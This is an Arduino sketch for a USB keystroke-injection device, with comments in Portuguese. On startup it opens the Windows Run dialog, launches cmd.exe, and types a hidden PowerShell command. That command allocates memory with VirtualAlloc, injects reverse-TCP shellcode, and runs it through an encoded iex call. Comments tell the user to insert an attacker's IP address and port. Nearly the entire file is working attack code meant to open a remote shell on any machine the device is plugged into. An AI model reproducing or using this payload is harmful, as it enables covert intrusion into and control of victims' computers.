//Modifier Keys
#define LEFT_CTRL   0x01
#define LEFT_SHIFT  0x02
#define LEFT_ALT    0x04
#define LEFT_GUI    0x08
#define RIGHT_CTRL  0x10
#define RIGHT_SHIFT 0x20
#define RIGHT_ALT   0x40
#define RIGHT_GUI   0x80

//Keys
#define KEY_ENTER 0x28
#define KEY_BACKSPEACE 0x2A
#define KEY_TAB 0x2B
#define KEY_CAPSLOCK 0x39

char alpha[27];
int mean_dic[27];

char normal_sym[22];
int mean_normal_sym[22];

char shift_sym[21];
int mean_shift_sym[21];

uint8_t buf[8] = {
  0 }; //buffer

void setup()
{
  alpha = {
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'  };
  mean_dic = {
    4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29  };
  normal_sym = {
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '[', ']', '\\', ';', '\'',  ',', '.', '/', ' '  };
  mean_normal_sym = {
    0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x33, 0x34, 0x36, 0x37, 0x38, 0x2C  };
  shift_sym = {
    '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '{', '}', '|', ':', '\"', '<', '>', '?'  };
  mean_shift_sym = {
    0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x33, 0x34, 0x36, 0x37, 0x38  };

  Serial.begin(9600);
  BackDoor(); // comando backdoor alterar endereço de ip && port
}

void loop()
{
  //keyString("abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ 1234567890 - = [] \\ ; ' , . / !@#$%^&*()_+ {}|; \" <> ?"); // <---test key
}

void keyRelease()
{
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8);    // Release key 
}

void keyString(String text) {

  char temp_char;
  boolean check;

  for(int i = 0;i<text.length();i++) {
    temp_char = text.charAt(i);
    if(((int)temp_char >= 97 && (int)temp_char <= 122) || ((int)temp_char >= 65 && (int)temp_char <= 90)) {
      for(int j = 0;j<sizeof(mean_dic) - 1;j++) {
        if(temp_char == alpha[j]) {
          keyPress(0, mean_dic[j]);
          keyRelease();
          break;
        }
        else if(temp_char == toupper(alpha[j])) {
          keyPress(LEFT_SHIFT, mean_dic[j]);
          keyRelease();
          break;
        }
      }
    }
    else {
      check = false;
      for(int j = 0;j<sizeof(mean_normal_sym) - 1;j++) {
        if(temp_char == normal_sym[j]) {
          check = true;
          keyPress(0, mean_normal_sym[j]);
          keyRelease();
          break;
        }
      }
      if(check == true) continue;

      for(int j = 0;j<sizeof(mean_shift_sym) - 1;j++) {
        if(temp_char == shift_sym[j]) {
          keyPress(LEFT_SHIFT, mean_shift_sym[j]);
          keyRelease();
          break;
        }
      }

    }
  }
}

void keyPress(int mod, int key) {
  buf[0] = mod;
  buf[2] = key;
  Serial.write(buf, 8);
}


void BackDoor(){
  delay(1000);
  keyPress(LEFT_GUI, 0x15); // Windows keys + R
  keyRelease();
  delay(200);
  keyString("cmd.exe");
  delay(200);         
  keyPress(0, KEY_ENTER);
  keyRelease();
  keyString("%PWRSHLXDD% -nop -w hidden -c \"$1 = '$c = ''");
  keyString("[DllImport(\\\"kernel32.dll\\\")]public static ext");
  keyString("ern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS");
  keyString("ize, uint flAllocationType, uint flProtect);[DllIm");
  keyString("port(\\\"kernel32.dll\\\")]public static extern In");
  keyString("tPtr CreateThread(IntPtr lpThreadAttributes, uint ");
  keyString("dwStackSize, IntPtr lpStartAddress, IntPtr lpParam");
  keyString("eter, uint dwCreationFlags, IntPtr lpThreadId);[Dl");
  keyString("lImport(\\\"msvcrt.dll\\\")]public static extern I");
  keyString("ntPtr memset(IntPtr dest, uint src, uint count);''");
  keyString(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
  keyString("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
  keyString(";[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,");
  keyString("0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,");
  keyString("0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,");
  keyString("0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,");
  keyString("0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,");
  keyString("0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,");
  keyString("0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,");
  keyString("0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,");
  keyString("0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,");
  keyString("0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,");
  keyString("0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,");
  keyString("0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,");
  keyString("0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,");
  keyString("0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,");
  keyString("0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,");
  keyString("0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,");
  keyString("0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,");
  keyString("0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,");
  keyString("0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,");
  keyString("0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,");

  // Muadar a parte com seu numero de ip [0x@@,0x@@,0x@@,0x@@] (Em Hex).
  // Mudar essa parte com o munero da porta[0x@@,0x@@] exemplo (e.g. 65535 = 0xFF,0xFF)
  // No remover >>>>> []

  keyString("[0x@@,0x@@,0x@@,0x@@],0x68,0x02,0x00,[0x@@,0x@@],0");



  keyString("x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0");
  keyString("x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0");
  keyString("x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0");
  keyString("x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0");
  keyString("xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0");
  keyString("x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0");
  keyString("xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0");
  keyString("xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0");
  keyString("xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -");
  keyString("gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc");
  keyString("(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length");
  keyString("-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $");
  keyString("sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;");
  keyString("){Start-sleep 60};';$gq = [System.Convert]::ToBase");
  keyString("64String([System.Text.Encoding]::Unicode.GetBytes(");
  keyString("$1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRo");
  keyString("ot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0");
  keyString("\\\\powershell\\\";$cmd = \\\"-nop -noni -enc \\\"");
  keyString(";iex \\\" $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -");
  keyString("noni -enc\\\";iex \\\" powershell $cmd $gq\\\";}\"");
  delay(200);         
  keyPress(0, KEY_ENTER);
  keyRelease();
}
